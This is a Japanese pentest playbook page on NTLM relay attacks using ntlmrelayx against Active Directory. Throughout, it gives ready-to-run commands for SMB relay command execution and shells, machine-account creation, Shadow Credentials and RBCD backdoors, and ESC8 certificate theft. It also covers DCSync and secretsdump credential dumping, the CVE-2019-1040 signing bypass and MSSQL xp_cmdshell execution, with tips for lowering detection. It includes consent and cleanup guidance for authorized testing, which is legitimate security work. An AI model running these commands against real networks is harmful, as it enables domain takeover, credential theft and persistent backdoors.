# ntlmrelayx — NTLM リレー攻撃

> **スコープ**: Responder / Coerce 系で取得した NTLM 認証フローをリレーして権限を得る。SMB シェル取得〜LDAP マシンアカウント追加〜LDAPS Shadow Credentials / RBCD 設定〜AD CS ESC8 証明書取得〜MSSQL OS コマンド実行〜socks セッション再利用〜Drop the MIC まで扱う。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 業務停止リスク（リレー先サービスの認証基盤への直接操作・マシンアカウント作成による AD 変更）
> - [x] 持続化に該当（Shadow Credentials / RBCD 設定はそのままバックドア権限として残る）
> - [ ] 不可逆な設定変更を含む（設定した RBCD・Shadow Credentials は削除可能だが要確認）
> - [x] SIEM/EDR で確実に検知される（Event ID 4624 Type 3 / 4741 / 4662 / MDI の NTLM Relay アラート）
>
> 実施可否は事前合意で明示確認すること。**Relay 先のプロトコル・ホストを書面で限定する。** Shadow Credentials・RBCD 設定は試験終了時に必ず削除する。演習環境では制約なし。

## 着火条件

以下のすべてが揃ったときに実施する：

- Responder（または Coerce 系ツール）によって **NTLM 認証フローを受け取れる** 状態にある
- 少なくとも 1 台以上の **リレー先ホスト** が存在する（プロトコル別の条件は後述）

## 環境前提
- 実行環境: テスター端末（Responder と同一マシン推奨。ポイズニングの受け口と Relay 処理を同じ端末で行う）
- 必要なツール: `ntlmrelayx.py`（Impacket 付属・ペネトレ用 Linux ディストリ標準搭載）
- 必要な権限: テスター端末上での `root` 権限（raw socket / 445 ポートのバインドのため）
- **必須の前提操作**: Responder の SMB / HTTP を **Off** にしてから ntlmrelayx を起動する（`Responder.md` §3 参照）

## 先に確認すること

**プロトコル別の署名要件（リレーが成立するかどうかはここで決まる）:**

| リレー先 | 必要な条件 | 確認コマンド |
|---------|-----------|------------|
| SMB | ターゲットの SMB Signing が `Not Required` | `nxc smb [TARGET_SUBNET]/[PREFIX] --gen-relay-list relay_targets.txt` |
| LDAP | DC の LDAP Signing が `Not Required` | `nxc ldap [DC_IP] -u '' -p '' 2>&1 \| grep -i signing` |
| LDAPS | LDAP Channel Binding が無効（EPA が None） | `ldapsearch -H ldaps://[DC_IP]` で確認 |
| HTTP / AD CS | 署名なし（WebDAV / WPAD / AD CS WebEnrollment は署名不要）| アクセス可能であれば条件成立 |
| MSSQL | ターゲットの MSSQL 接続が NTLM 認証を受け付けている | `nxc mssql [TARGET_IP] -u '' -p ''` |

**プロトコル別リレーの効果:**

| リレー先プロトコル | 主な成果 | 署名バイパス要否 |
|----------------|--------|--------------|
| SMB | ファイルアクセス / コマンド実行 / socks セッション | SMB Signing = Not Required |
| LDAP | ユーザー列挙・ACL 変更・マシンアカウント追加 | LDAP Signing = Not Required |
| LDAPS | Shadow Credentials 追加 / RBCD 設定 | Channel Binding = None |
| MSSQL | OS コマンド実行（xp_cmdshell）| NTLM 認証受付 |
| HTTP（AD CS WebEnrollment）| DC$ / ユーザーの証明書取得（ESC8）| 署名不要 |

**攻撃者の思考トレース:** NTLM はチャレンジ・レスポンス型の認証プロトコルであり、クライアントから来た認証情報をそのまま別ホストへ「中継」できる。ハッシュをクラックする必要がないため、強いパスワードが設定されていても通用する。リレー先プロトコルによって得られる成果が異なるため、環境の署名設定を見て最も効果的な経路を選ぶ。

---

## 1. リレーターゲットリストの作成

**事前準備（必須）:**

```bash
# [Attacker] SMB Signing が Not Required なホストの一覧を生成
nxc smb [TARGET_SUBNET]/[PREFIX] --gen-relay-list relay_targets.txt
cat relay_targets.txt
```

---

## 2. SMB リレー — コマンド実行・ファイルアクセス

**コマンド:**

```bash
# [Attacker] SMB リレー：コマンド実行
ntlmrelayx.py -tf relay_targets.txt -smb2support -c "whoami"

# [Attacker] インタラクティブ SMB シェル（nc で接続して操作）
ntlmrelayx.py -tf relay_targets.txt -smb2support -i
# 別ターミナルで: nc 127.0.0.1 [LOCAL_PORT]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| コマンド実行結果が返る | SMB リレー成功 + 管理者権限 | 目的の操作 / §7 socks モードへ |
| `Signing is required` | リレー先の署名が有効 | 別プロトコル（LDAP / LDAPS / HTTP）を試す |
| 成功するが管理者でない | 一般ユーザーの認証 | §7 socks モードで活用できる権限を確認 |

**注意:** ntlmrelayx の `-c` でコマンドを実行すると新規サービスが作成される（Event ID 7045 が記録される）。本番では §7 socks + proxychains 経由での操作の方が検知リスクが低い。

---

## 3. LDAP リレー — マシンアカウント追加・ACL 変更

**着火条件:** DC の LDAP Signing が Not Required。

**コマンド:**

```bash
# [Attacker] LDAP リレー：新規マシンアカウントを作成する
ntlmrelayx.py -t ldap://[DC_IP] --add-computer [CASE_ID]_RELAY$ [STRONG_MACHINE_PASSWORD]
# 作成されたマシンアカウント名とパスワードが出力される

# 原状回復（テスト完了時に必ず削除）
bloodyAD -u [USER] -p [PASSWORD] -d [DOMAIN] --host [DC_IP] delObject [CASE_ID]_RELAY$
```

> `[CASE_ID]_RELAY$` はテスト識別子コメントマーカー方式の命名（原状回復時に grep で識別できる）。

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| マシンアカウントが作成される | LDAP リレー成功 | 作成したアカウントで §4 RBCD 設定へ |
| LDAP リレーが失敗 | DC の LDAP Signing が必須 | LDAPS リレー（§4 / §5）へ切り替える |

**注意（原状回復）:** 作成したマシンアカウントはテスト完了時に必ず削除する。AD のマシンアカウント数の上限（デフォルトで一般ユーザーは 10 台）を消費する。

---

## 4. LDAPS リレー — Shadow Credentials（msDS-KeyCredentialLink 追加）

**着火条件:** LDAP Channel Binding が無効。証明書ベースで TGT を取得する最も強力な経路の一つ。

**コマンド:**

```bash
# [Attacker] LDAPS リレー：ターゲットマシンアカウントに Shadow Credentials を追加
ntlmrelayx.py -t ldaps://[DC_IP] --shadow-credentials --shadow-target [TARGET_MACHINE$]
# → 成功すると「添付した証明書の PFX ファイルパス」と「パスワード」が出力される

# [Attacker] 取得した PFX ファイルで PKINIT 認証 → TGT 取得
python3 PKINITtools/gettgtpkinit.py \
  -cert-pfx [OUTPUT_PFX_PATH] -pfx-pass [PFX_PASSWORD] \
  [DOMAIN]/[TARGET_MACHINE$] [TARGET_MACHINE].ccache

# [Attacker] NT ハッシュの取得
export KRB5CCNAME=[TARGET_MACHINE].ccache
python3 PKINITtools/getnthash.py -key [AS_REP_ENCRYPTION_KEY] [DOMAIN]/[TARGET_MACHINE$]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| PFX ファイルパスとパスワードが出力 | Shadow Credentials 追加成功 | PKINIT → NT ハッシュ → DCSync → `../Credential_Dumping.md` |
| Channel Binding エラー | Channel Binding が有効 | §5 ESC8 リレーを試す |

**注意（原状回復）:** 追加した KeyCredential はテスト完了時に削除する。`bloodyAD` または `pywhisker` の `--action remove` で削除可能。削除漏れはバックドアになる。

---

## 5. AD CS ESC8 リレー — DC$ の証明書取得

**事前準備（必須）:** AD CS WebEnrollment エンドポイントの確認。

```bash
# [Attacker] AD CS WebEnrollment エンドポイントの存在確認
curl -k http://[CA_SERVER]/certsrv/
# → 認証ダイアログが返ってくれば WebEnrollment エンドポイントが存在する
```

**コマンド:**

```bash
# [Attacker] ESC8 リレー：DC$ の認証を AD CS HTTP エンドポイントにリレー
ntlmrelayx.py -t http://[CA_SERVER]/certsrv/certfnsh.asp --adcs --template [CERT_TEMPLATE]
# --template には "DomainController" または ESC8 に脆弱なカスタムテンプレートを指定
# → 成功すると DC$ 宛の証明書（Base64 PFX）が出力される

# [Attacker] 取得した証明書で PKINIT → DC$ TGT 取得
python3 PKINITtools/gettgtpkinit.py -pfx-base64 [BASE64_PFX] \
  [DOMAIN]/[DC_HOSTNAME]$ dc.ccache

# [Attacker] DC$ TGT を使って DCSync
export KRB5CCNAME=dc.ccache
impacket-secretsdump -k -no-pass -just-dc-ntlm -target-ip [DC_IP] [DC_HOSTNAME]$@[DC_FQDN]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| Base64 PFX が出力される | ESC8 リレー成功 | PKINIT → DC$ TGT → DCSync → `../Credential_Dumping.md` |
| 証明書取得できない | WebEnrollment 非存在 / HTTPS のみ | `../AD_CS/Overview.md` で別の ESC を探す |

> **Coerce との連携**: ESC8 は Coerce 系で DC 自身に認証を強制させることで確実に実行できる → `Coerce.md`

---

## 6. LDAPS リレー — RBCD 設定（delegate-access）

**コマンド:**

```bash
# [Attacker] 事前に --add-computer でマシンアカウントを作成しておく（§3 参照）
# LDAPS リレー：RBCD 設定（テスター側マシンアカウントから対象ホストへの委任を設定）
ntlmrelayx.py -t ldaps://[DC_IP] --delegate-access --escalate-user [CASE_ID]_RELAY$
# → 対象ホストの msDS-AllowedToActOnBehalfOfOtherIdentity に [CASE_ID]_RELAY$ が追加される
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| RBCD 設定が追加される | LDAPS リレー成功 | S4U 攻撃フロー → `../Delegation_Attacks/RBCD.md` |

**注意（原状回復）:** `msDS-AllowedToActOnBehalfOfOtherIdentity` に残ったエントリはバックドア権限になる。テスト完了時に必ず削除する。

---

## 7. socks モード — セッションの持続的再利用

リレーで取得した認証済みセッションを SOCKS プロキシ経由で再利用する。

**コマンド:**

```bash
# [Attacker] socks モードで起動
ntlmrelayx.py -tf relay_targets.txt -smb2support -socks

# ntlmrelayx コンソールでセッション確認
# ntlmrelayx> socks

# [Attacker] /etc/proxychains.conf に「socks5 127.0.0.1 1080」を追記後
proxychains impacket-smbclient //[TARGET_IP]/C$ -U [DOMAIN]/[USER]
proxychains impacket-secretsdump [DOMAIN]/[USER]@[TARGET_IP] -no-pass
```

---

## 8. Drop the MIC（CVE-2019-1040）— 署名バイパス

MIC（Message Integrity Code）フィールドを削除して署名チェックをバイパスする。通常は Relay 不可の構成でもリレーを可能にする。

**コマンド:**

```bash
# [Attacker] Drop the MIC を有効化して Relay（--remove-mic フラグ）
ntlmrelayx.py -tf relay_targets.txt -smb2support --remove-mic
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| リレーが成立する | CVE-2019-1040 が効いた（パッチ未適用）| 目的の操作へ |
| 認証エラーが続く | パッチ適用済み（2019年7月以降 KB4493471）| 通常の Relay に戻る |

**注意:** CVE-2019-1040 はパッチ未適用の環境でのみ有効。まず通常の Relay を試み、失敗した場合のみ `--remove-mic` を試す。

---

## MSSQL リレー — OS コマンド実行

```bash
# [Attacker] MSSQL リレー：xp_cmdshell 経由で OS コマンド実行
ntlmrelayx.py -t mssql://[MSSQL_TARGET_IP] -q "EXEC xp_cmdshell 'whoami'"
```

> MSSQL で xp_cmdshell が無効な場合、ntlmrelayx が自動で有効化を試みる。本番では xp_cmdshell の有効化自体が「不可逆な設定変更」扱いになる可能性があるため、事前合意が必要。

---

## 刺さらなかったとき（全体）

| 状況 | 対処 |
|------|------|
| `Signing is required` エラーが出る | 別プロトコル（LDAP / LDAPS / HTTP）を試す |
| SMB リレー成功するが管理者でない | socks モードで活用できる権限を確認 |
| LDAP リレーが失敗する | DC の LDAP Signing が必須。LDAPS リレー（§4 / §6）へ切り替える |
| LDAPS で Channel Binding エラー | Shadow Credentials / RBCD は使えない。ESC8（§5）を試す |
| ESC8 で証明書取得できない | AD CS WebEnrollment が存在しない・HTTPS のみ対応。Certipy で別の ESC を探す → `../AD_CS/Overview.md` |
| Relay 先が来ない | Responder の Analyze モードで問い合わせが来ているか確認。LLMNR/NBT-NS が GPO で無効なら Coerce 系 → `Coerce.md` / IPv6 環境 → `mitm6.md` |

---

## 注意点・落とし穴

- **Responder の SMB/HTTP が On のまま ntlmrelayx を起動しない**: ポート 445/80 の競合で両方が機能不全になる
- **`--add-computer` で作成したマシンアカウントは必ず削除する**: テスト識別子コメントマーカー方式で命名しておくと削除漏れを防げる
- **Shadow Credentials の削除漏れはバックドアになる**: `msDS-KeyCredentialLink` にテスター生成の公開鍵が残ると誰でも対象マシンの TGT を取得できる状態になる
- **RBCD 設定の削除漏れも同様**: `msDS-AllowedToActOnBehalfOfOtherIdentity` に残ったエントリはバックドア権限になる

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。LDAP 操作・マシンアカウント作成・証明書取得はドメイン全体への影響が直接及ぶ
- **想定されるSIEM/EDR検知**: MDI NTLM Relay アラート / Event ID 4741（マシンアカウント作成）/ 4662（LDAP 操作）/ 4624 Type 3 / Sysmon Event 3 / サービス作成 Event 7045
- **業務影響リスク**: MSSQL xp_cmdshell 有効化は業務影響あり。SMB リレーのコマンド実行もサービス作成を伴う
- **原状回復必須項目**: ✅ 作成したマシンアカウントの削除 / ✅ Shadow Credentials の削除 / ✅ RBCD エントリの削除 / ✅ MSSQL で有効化した xp_cmdshell の無効化 / ✅ 取得した証明書・TGT・NTLM ハッシュの暗号化保管 → テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：LLMNR / NBT-NS / WPAD ポイズニング → `Responder.md`
- 前：Coerce 系による認証強制（PetitPotam / PrinterBug / DFSCoerce）→ `Coerce.md`
- 前：IPv6 DNS スプーフィング → `mitm6.md`
- 後（Shadow Credentials 取得後）：PKINIT → NT ハッシュ取得 → DCSync → `../Credential_Dumping.md`
- 後（RBCD 設定後）：S4U2self でチケット取得 → `../Delegation_Attacks/RBCD.md`
- 後（ESC8 証明書取得後）：PKINIT → DC$ TGT → DCSync → `../Credential_Dumping.md` / `../AD_CS/ESC8.md`
- 後（マシンアカウント作成後）：Kerberoasting の候補追加 → `../Kerberos_Attacks/Kerberoasting.md`
